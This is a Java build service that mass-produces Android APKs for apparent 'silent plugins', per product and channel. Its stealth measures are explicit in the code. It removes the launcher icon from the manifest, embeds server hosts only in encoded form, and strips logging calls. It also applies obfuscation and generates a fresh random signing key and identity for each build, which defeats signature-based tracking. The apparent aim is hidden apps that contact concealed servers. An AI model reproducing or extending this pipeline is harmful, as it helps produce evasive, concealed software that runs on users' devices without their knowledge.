package net.workspace.web.service;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Random;
import net.workspace.web.entity.PackageEntity;
import net.workspace.web.entity.SettingEntity;
import net.workspace.web.service.Util.ReplaceModel;
import net.workspace.web.util.ParseKsy;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

@Component
public class BuildService {
    /**
     * WEIBOURL=http://weibo.10086.cn/feedin  for Care
     * WEIBOURL=http://weibo.10086.cn/hikelee for WG
     */
    static final String HOST_FLOW = "{\"x8\":[{\"aa1\":101,\"m1\":{\"i3\":[{\"h3\":\"hostName\",\"h2\":\"enclosed(/-/`/-/)\"}]},\"y2\":9228213228309,\"y3\":4,\"l1\":\"WEIBOURL\"}],\"x3\":1,\"x1\":9228213228309}";
    private StringBuilder cmdOut = new StringBuilder();
    private StringBuilder cmdError = new StringBuilder();
    private static final Logger LOGGER = LoggerFactory.getLogger("AdminLogger");
    @Autowired
    private SettingService settingService;
    @Autowired
    HostConfigService hostConfigService;
    @Autowired
    private PackageService pkgService;
    private final static String CODE_PATH = (Util.isWindows ? "E:" : "") + "/workspace/plugin/code/plugin";
    private final static String mvnBase = getMvnBase();
    // CornJob
    private static boolean building = false;
    private static final Object locker = new Object();
    static Random random = new Random();
    private String build(PackageEntity pkg) {
        String product = pkg.getProduct();
        Long channelId = pkg.getChannel().getId();
        String packageName = pkg.getPackageName();
        String debug = pkg.getDebug();
        String versionName = pkg.getVersionName();
        int versionCode = pkg.getVersionCode();
        boolean pkgShowIcon = pkg.isShowIcon();
        String iconName = pkg.getIconName();
        String activateComponent = pkg.getActivateComponent();
        String appName = pkg.getAppName();
        String channelUUid = pkg.getChannel().getUuid();
        String error = null;
        SettingEntity setting = settingService.get();
        if (setting == null || StringUtils.isBlank(setting.getBizHost())) {
            error = "业务域名没有设定";
        }
        if (error == null) {
            try {
                String apkPath = "/release/" + product + "/" + channelId + "/" + product + "-" + new SimpleDateFormat("yyyyMMdd-HHmmss-S").format(new Date()) + ".apk";
                String apkLocation = (Util.isWindows ? "E:" : "") + "/workspace/plugin" + apkPath;
                File apkFolder = new File(apkLocation).getParentFile();
                if (!apkFolder.exists()) apkFolder.mkdirs();
                pkg.setDownloadUrl((Util.isWindows ? "http://localhost/pluginweb" : "/static") + apkPath);
                String projectPath = CODE_PATH + "/" + product;
                String buildPath = (Util.isWindows ? "E:" : "") + "/tmp/" + product + "-" + channelId;
                //delete
                File buildDir = new File(buildPath);
                if (buildDir.exists()) FileUtils.deleteDirectory(buildDir);
                //Copy
                {
                    LOGGER.info("Copy project to " + buildPath + " start");
                    FileUtils.copyDirectory(new File(projectPath), buildDir);
                    FileUtils.deleteDirectory(new File(buildPath + "/bin"));
                    FileUtils.deleteDirectory(new File(buildPath + "/gen"));
                    LOGGER.info("Copy project to " + buildPath + " end");
                }
                {
                    removeLoggerPhases(buildPath, "MyLogger.");
                }
                //
                String newPackage = packageName;
                BuildServiceUtil.update(buildPath, newPackage);
                //
                String configFile = buildPath + "/AndroidManifest.xml";
                {
                    String oldActivateComponentName = "com.android.FlaaaaaaaaaaaagService";
                    String newActivateComponent = activateComponent;
                    if (!oldActivateComponentName.equals(newActivateComponent)) {
                        String oldClassName = oldActivateComponentName.substring(oldActivateComponentName.lastIndexOf(".") + 1);
                        String oldPackageName = oldActivateComponentName.substring(0, oldActivateComponentName.lastIndexOf("."));
                        String oldPath = buildPath + "/src/" + oldActivateComponentName.replace('.', '/') + ".java";
                        String newClassName = newActivateComponent.substring(newActivateComponent.lastIndexOf(".") + 1);
                        String newPackageName = newActivateComponent.substring(0, newActivateComponent.lastIndexOf("."));
                        BuildServiceUtil.updateFileContent(oldPath, oldClassName, newClassName);
                        BuildServiceUtil.updateFileContent(oldPath, oldPackageName, newPackageName);
                        String newPath = buildPath + "/src/" + newActivateComponent.replace('.', '/') + ".java";
                        FileUtils.moveFile(new File(oldPath), new File(newPath));
                        BuildServiceUtil.updateFileContent(configFile, oldActivateComponentName, newActivateComponent);
                    }
                }
                {
                    BuildServiceUtil.updateFileContent(buildPath + "/.project", "plugin-trunk", "plugin-trunk-build");
                }
                String bizFile = buildPath + "/src/" + newPackage.replace('.', '/') + "/biz/BIZ.java";
                String prugardWindowsTxt = buildPath + "/proguard-keys.txt";
                String proguardFile = buildPath + "/proguard.cfg";
                //
                boolean debugEnabled = "Y".equals(debug);
                Util.replaceAttributes(configFile, //
                        new ReplaceModel("android:versionName=\"", "\"", versionName), //
                        new ReplaceModel("android:versionCode=\"", "\"", versionCode + ""),//
                        //new ReplaceModel("<!--DeleteStart-->", "<!--DeleteEnd-->", ""),//
                        new ReplaceModel("package=\"", "\"", packageName));
                boolean showIcon = debugEnabled || pkgShowIcon;
                if (!showIcon) {
                    Util.replaceAttributes(configFile, new ReplaceModel("<!--DeleteStart-->", "<!--DeleteEnd-->", ""));
                }
                if (iconName == null) iconName = "";
                Util.replaceAttributes(configFile, new ReplaceModel("android:label=\"", "\"", appName));
                String configContent = FileUtils.readFileToString(new File(configFile));
                configContent = configContent.replaceAll("app-label_name", appName);
                configContent = configContent.replaceAll("activity-label-name", iconName);
                FileUtils.write(new File(configFile), configContent);
                if (StringUtils.isBlank(setting.getWeiboUrl())) {
                    error = "weibo-url-empty";
                }
                String pomFile = buildPath + "/pom.xml";
                error = replacePomFile(packageName, versionName, apkLocation, pomFile);
                if (error == null) {
                    String parseKsyFile = newPackage + ".util.ParseKsy";
                    String encodedWeiboUrl = parseKsyFile + ".decode(\"" + ParseKsy.encode(HOST_FLOW.replaceAll("WEIBOURL", setting.getWeiboUrl())) + "\")";
                    String encodedChannelUUid = parseKsyFile + ".decode(\"" + ParseKsy.encode(channelUUid) + "\")";
                    String encodedBizHost = parseKsyFile + ".decode(\"" + ParseKsy.encode(setting.getBizHost()) + "\")";
                    Util.replaceAttributes(bizFile, //
                            new ReplaceModel("/*host-flow-begin*/", "/*host-flow-end*/", encodedWeiboUrl),//
                            new ReplaceModel("/*channel-begin*/", "/*channel-end*/", encodedChannelUUid),//
                            new ReplaceModel("/*host-name-begin*/", "/*host-name-end*/", encodedBizHost)//
                    );
                    if (debugEnabled) {
                        String proguardDebugFile = buildPath + "/proguard-debug.cfg";
                        FileUtils.copyFile(new File(proguardDebugFile), new File(proguardFile));
                    }
                    Util.generateProguardKeywors(prugardWindowsTxt);
                    int result = Util.exeCmd(Util.mvnCmd + "  -f \"" + pomFile + "\" clean install -Psign", cmdOut, cmdError);
                    if (result == 0) {
                        String mavenPath = getMavenPath(product, packageName, versionName);
                        FileUtils.copyFile(new File(mavenPath), new File(apkLocation));
                        LOGGER.info(mavenPath + " copied to " + apkLocation);
                    }
                }
            } catch (Exception e) {
                error = Util.getStack(e);
                LOGGER.error(e.getMessage(), e);
            }
        }
        return error;
    }
    private String getMavenPath(String product, String pkgName, String versionName) {
        String alignedTargetSuffix = "-aligned.apk";
        String path = mvnBase + "/" + pkgName.replace('.', '/') + "/" + product + "/" + versionName + "/" + product + "-" + versionName;
        return path + alignedTargetSuffix;
    }
    private String replacePomFile(String packageName, String versionName, String apkLocation, String pomFile) {
        String error = null;
        try {
            Util.replaceAttributes(pomFile,//
                    new ReplaceModel("<version>", "</version>", versionName)//
                    , new ReplaceModel("<groupId>", "</groupId>", packageName)//
            );
            if (!Util.isWindows) { //如果为静默插件,每次打包都要换签名
                String keyStorePath = apkLocation + ".keystore";
                String keyStoreInfoPath = keyStorePath + ".txt";
                String alias = Util.getRandomString(5);
                String keypass = Util.getRandomString(8);
                String storepass = Util.getRandomString(8);
                String CN = Util.getRandomString(5);
                String OU = Util.getRandomString(2);
                String O = Util.getRandomString(2);
                String L = Util.getRandomString(2);
                String S = Util.getRandomString(2);
                String C = Util.getRandomString(2);
                String cmd = String.format(
                        "/usr/bin/keytool -genkey -noprompt -v -keystore %s -alias %s -keyalg RSA -keysize 2048 -validity 10000 -keypass %s -storepass %s -dname \"CN=%s, OU=%s, O=%s, L=%s, S=%s, C=%s\"" //
                        , keyStorePath, alias, keypass, storepass, CN, OU, O, L, S, C);
                FileUtils.write(new File(keyStoreInfoPath), cmd);
                int result = Util.exeCmd("/bin/bash " + keyStoreInfoPath, cmdOut, cmdError);
                if (result == 0) {
                    Util.replaceAttributes(pomFile //
                            , new ReplaceModel("<storepass>", "</storepass>", storepass)//
                            , new ReplaceModel("<keypass>", "</keypass>", keypass)//
                            , new ReplaceModel("<alias>", "</alias>", alias)//
                            , new ReplaceModel("<keystore>", "</keystore>", keyStorePath)//
                    );
                } else {
                    error = "Error generating keystore:" + cmdError.toString();
                }
            }
        } catch (Throwable e) {
            error = Util.getStack(e);
            LOGGER.error(e.getMessage(), e);
        }
        return error;
    }
    public void selectOne() {
        boolean buildEnabled = Util.isWindows || hostConfigService.isBuildEnabled();
        if (!buildEnabled) return;
        synchronized (locker) {
            if (building) return;
            building = true;
        }
        try {
            List<PackageEntity> buildList = pkgService.getBuilList();
            int batchCount = 3;
            for (PackageEntity pkg : buildList) {
                String projectPath = CODE_PATH + "/" + pkg.getProduct();
                Util.exeCmd(Util.svnCmd + " update " + projectPath, cmdOut, cmdError);
                pkg = pkgService.get(pkg.getId());//Reget the data from db to avoid overriding the data.
                pkg.setBuildStatus("正在打包");
                pkgService.save(pkg);
                String error = build(pkg);
                if (error == null) {
                    pkg.setBuildStatus("done");
                } else {
                    pkg.setBuildStatus(StringUtils.left(error, 1000));
                }
                pkg.setNeedBuild("N");
                pkgService.save(pkg);
                if (batchCount-- < 0) break;
            }
        } catch (Exception e) {
            LOGGER.error(e.getMessage(), e);
        }
        synchronized (locker) {
            building = false;
        }
    }
    private static final String getMvnBase() {
        if (Util.isWindows) return "E:/data/mavenRepository";
        for (String name : new String[] { "bare", "alex", "hike", "user" }) {
            String file = "/home/" + name + "/.m2/repository";
            if (new File(file).exists()) return file;
        }
        return null;
    }
    public static void main(String[] args) {
        System.out.println(Util.getRandomString(20));
    }
    public static void removeLoggerPhases(String path, String debugName) throws Exception {
        for (File file : new File(path).listFiles()) {
            String childpath = file.getAbsolutePath();
            if (file.isDirectory()) {
                removeLoggerPhases(childpath, debugName);
            } else if (childpath.endsWith(".java")) {
                StringBuilder sb = new StringBuilder();
                for (String line : FileUtils.readLines(file, "utf-8")) {
                    if (line.trim().startsWith(debugName)) continue;
                    sb.append(line).append("\n");
                }
                FileUtils.write(file, sb.toString());
            }
        }
    }
}
